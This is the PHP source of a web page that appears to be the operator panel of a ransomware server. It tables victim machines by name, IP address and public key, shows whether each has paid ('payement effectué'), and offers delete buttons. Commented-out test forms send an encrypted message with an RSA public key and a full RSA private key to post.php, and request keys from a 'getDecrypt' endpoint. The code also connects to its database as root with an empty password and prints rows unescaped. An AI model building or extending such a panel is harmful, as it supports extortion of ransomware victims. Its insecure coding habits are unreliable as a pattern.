<!DOCTYPE html>
<html>
  <head>
  	<?php
	include 'database.php';
    ?>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="style.css">
    <title>Index</title>
  </head>
  <!--<form action="post.php" method="POST">
  	<input type="hidden" name="rsa_message" value="('o\xfc]\\Q\xec\xc7\xbb\xc2=F\xff"\x90O\xf4\xcf\'\xe5\xf6.\xd3"\t\xa62\xa7\xd9\xf73\xd4t\x16\xa9\x82"\\\x86\x8flLp\xaf\xe9 2\xf7\xfc\xa0tI%\x05\xa1\x99\rk|J\xf1\x11\xbcx\xbc\x98\x008X\xe9).\xc7\xe8+\x92K\x81\xb9\xe05\xf8\\O3\xf1F\xe5\x11\r{\x8a\xc7y&^DO\x84\x8e\x1c\x81j:\xa8yd0\xca\xe8B\x8b\x8es\xecy\x0f\x98\x12\xe3+\xb62\xdcW\x8d\x18\xae-',)">
  	<input type="hidden" name="rsa_pukey" value="-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDyQZoDf3T+tgjrYfH6TGmVdX1L
fTJKPSNnnunYWlghiRqOjJWDL+g8ogUnbck8ITMPtFURBx16OKS91ZYCL1nopS/h
DLwqLnVuY39WFLMJooZs4+W/Np/IlaOpfQhCVrWwJEfJyOcrvGBaiLqvPWyXAN64
H13fFwobU8ASbfxrTwIDAQAB
-----END PUBLIC KEY-----">
  	<input type="hidden" name="rsa_prkey" value="-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQD+0ByQdaNtHNxe+W5XGlb63+jdP+hn6bj+XdV287WDWPDRXfR8
XLnSAij336E8gbUM2+qyBtDqKwf5/MZeObDnpXTI70PLDBXvPaIBh5OcTggywo69
bGd/NAkX0ZyJv35vlqcJNatCgXI+YCjcpuhoxSCyVvXBW2LCKRmTUaURSwIDAQAB
AoGAJJk1kRYka/aaPFXtIDubRJtGcgjM06gBNx+5GkW0y3HJ3Ph2tioHUn+W7MtE
+FDU9Uzc78cE2K1njuNchooYu1NtHnWvm/ZXe3xS7hefIwGy0IzUD5y+rv3aOQQ0
jdmqKuMPauTJHdNZeJICvhSOxMpVDOIx2YGDqFMt0RNN9xkCQQD/cg1df4yZIAG1
WguGdv+iudBqmfr9oM0c36ZAOcsicEnETsNn0QTW6LLnXp4dzbF4I1k8B3uqBNXR
XdNKxVEPAkEA/121NfMV9HU9Mip3/P+2WNn6BxyXHTS9VdEPDQFTUVAOkAEi9b/X
/kRb+UjeTnIdqlUGA3C25tSj12qypJXEBQJAVIyvl87r/pL1fc08G1mv63CNZ3tn
9CMRQQlVwdRfRBrej7dyPh6U9302GhbbRwoaP6WTl6bya6gGDbJ8iTceSQJBAIDA
q4P2+yPVFLS9at/5weOMi56YUKyeEbQ6At+owmxl8+GxYQIM5wdBSionDkb5DHH8
ClsjsmQx5CXRmx6WkE0CQQCq28HF+S+HaTI4fcFQIK8xpiKus5RxQSCw520tFf+N
jvhtfkRR4d4oR6boiA1ymlozoglPv+rcKQY194pRG5QD
-----END RSA PRIVATE KEY-----">
  	<input type="submit" value="post.php">
  </form>

  <form action="getDecrypt.php" method="POST">
    <input type="hidden" name="ipAddress" value="192.168.0.1">
    <input type="hidden" name="machineName" value="pc de jean">
    <input type="submit" value="getDecrypt">
  </form>-->
  <body>
  	<table border="1">
  		<tr><td>id</td><td>machine name</td><td>adresse ip</td><td>public Key</td><td>payement effectué</td><td></td></tr>

  	<?php
  		$result = connect("root","")->query("SELECT * from infos");
		foreach ($result as $row) {
			$html= '<tr>';
			$html.= '<td>'.$row['id'].'</td>';
			$html.= '<td>'.$row['machineName'].'</td>';
			$html.= '<td>'.$row['ipAddress'].'</td>';
			$html.= '<td>'.$row['publicKey'].'</td>';
			$html.= '<td>'.$row['payement'].'</td>';
			$html.= '<td>
			<form action="delete.php" method="POST">
    		<input type="hidden" name="id" value="'.$row['id'].'">
    		<input type="submit" value=" ">
  			</form>
			</td>';
			$html.='</tr>';
			echo $html;
		}

  	?>
  	</table>
  </body>
</html>
